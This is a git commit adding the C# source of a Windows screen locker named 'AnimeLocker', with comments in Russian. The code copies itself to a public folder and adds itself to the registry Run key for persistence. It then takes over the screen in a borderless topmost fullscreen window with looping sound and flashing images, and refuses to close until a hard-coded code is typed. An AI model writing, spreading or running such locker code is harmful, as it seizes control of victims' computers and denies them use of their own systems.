4b8b1cb17c39c3bddd4442a5532b13f51aac21ac
DeGZeG <degzeg@gmail.com>
2018-01-07 15:19:12 +0500

    Импорт

--- Locker/Form1.Designer.cs
+++ Locker/Form1.Designer.cs
@@ -28,25 +28,62 @@
         /// </summary>
         private void InitializeComponent()
         {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.exitbutton = new System.Windows.Forms.Button();
             this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
             this.SuspendLayout();
+            // 
+            // exitbutton
+            // 
+            this.exitbutton.Anchor = System.Windows.Forms.AnchorStyles.None;
+            this.exitbutton.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
+            this.exitbutton.Location = new System.Drawing.Point(173, 200);
+            this.exitbutton.Name = "exitbutton";
+            this.exitbutton.Size = new System.Drawing.Size(144, 47);
+            this.exitbutton.TabIndex = 0;
+            this.exitbutton.Text = "Выход";
+            this.exitbutton.UseVisualStyleBackColor = true;
+            this.exitbutton.Visible = false;
+            this.exitbutton.Click += new System.EventHandler(this.exitbutton_Click);
             // 
             // textBox1
             // 
-            this.textBox1.Location = new System.Drawing.Point(105, 86);
+            this.textBox1.Anchor = System.Windows.Forms.AnchorStyles.None;
+            this.textBox1.Location = new System.Drawing.Point(122, 173);
             this.textBox1.Name = "textBox1";
-            this.textBox1.Size = new System.Drawing.Size(100, 20);
-            this.textBox1.TabIndex = 0;
-            this.textBox1.Text = "Хуй";
+            this.textBox1.Size = new System.Drawing.Size(177, 20);
+            this.textBox1.TabIndex = 1;
+            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // button1
+            // 
+            this.button1.Anchor = System.Windows.Forms.AnchorStyles.None;
+            this.button1.Location = new System.Drawing.Point(305, 171);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "Ввод";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
             // 
             // Form1
             // 
-            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
-            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(284, 261);
+            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
+            this.ClientSize = new System.Drawing.Size(484, 461);
+            this.Controls.Add(this.button1);
             this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.exitbutton);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.Name = "Form1";
-            this.Text = "Form1";
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Аниме";
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
+            this.Load += new System.EventHandler(this.Form1_Load);
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -54,7 +91,9 @@
 
         #endregion
 
+        private System.Windows.Forms.Button exitbutton;
         private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button1;
     }
 }
 
--- Locker/Form1.cs
+++ Locker/Form1.cs
@@ -5,16 +5,193 @@ using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Text;
+using System.Media;
+using System.Diagnostics;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
 
 namespace Locker
 {
     public partial class Form1 : Form
     {
+        private void Pause(int value)
+        {
+            Stopwatch sw = new Stopwatch();
+            sw.Start();
+            while (sw.ElapsedMilliseconds < value)
+                Application.DoEvents();
+        }
+        SoundPlayer Sound = new SoundPlayer(Properties.Resources.Music);
+        int i = 0, k = 0, j;
         public Form1()
         {
             InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            //Создание копии
+            string targetPath = @"C:\Users\Public\";
+            string sourceFile = System.Windows.Forms.Application.ExecutablePath;
+            string destFile = System.IO.Path.Combine(targetPath, "AnimeLocker.exe");
+            if (System.Windows.Forms.Application.ExecutablePath != destFile)
+            {
+                System.IO.File.Copy(sourceFile, destFile, true);
+            }
+            //Добавление копии в автозапуск
+            string name = "AnimeLocker";
+            string ExePath = destFile;
+            Microsoft.Win32.RegistryKey reg;
+            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+                reg.SetValue(name, ExePath);
+                reg.Close();
+            }
+            catch (Exception ex) { MessageBox.Show(ex.Message); }
+            //Начинка
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.ControlBox = false;
+            this.WindowState = FormWindowState.Maximized;
+            this.TopMost = true;
+            this.ShowInTaskbar = false;
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.Move += delegate { this.Capture = false; };
+            Sound.PlayLooping();
+            for (j = 0; j <= 2; j++)
+            {
+                this.BackgroundImage = Properties.Resources.pic1;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic2;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic3;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic4;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic5;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic6;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic23;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic8;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic9;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic10;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic11;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic22;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic13;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic14;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic15;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic16;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic17;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic18;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic19;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic20;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic21;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic12;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic7;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic24;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                Pause(250);
+                this.BackgroundImage = Properties.Resources.pic25;
+                this.WindowState = FormWindowState.Maximized;
+                this.TopMost = true;
+                j--;
+            }
+        }
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            if (k == 0) e.Cancel = true;
+        }
+        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            Sound.Stop();
+        }
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (textBox1.Text == "2281337") { exitbutton.Visible = true; k = 1; }
+        }
+        private void exitbutton_Click(object sender, EventArgs e)
+        {
+            //Удаление из автозапуска
+            Microsoft.Win32.RegistryKey reg;
+            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+                reg.DeleteValue("AnimeLocker");
+                reg.Close();
+            }
+            catch { }
+            Environment.Exit(0);
         }
     }
 }
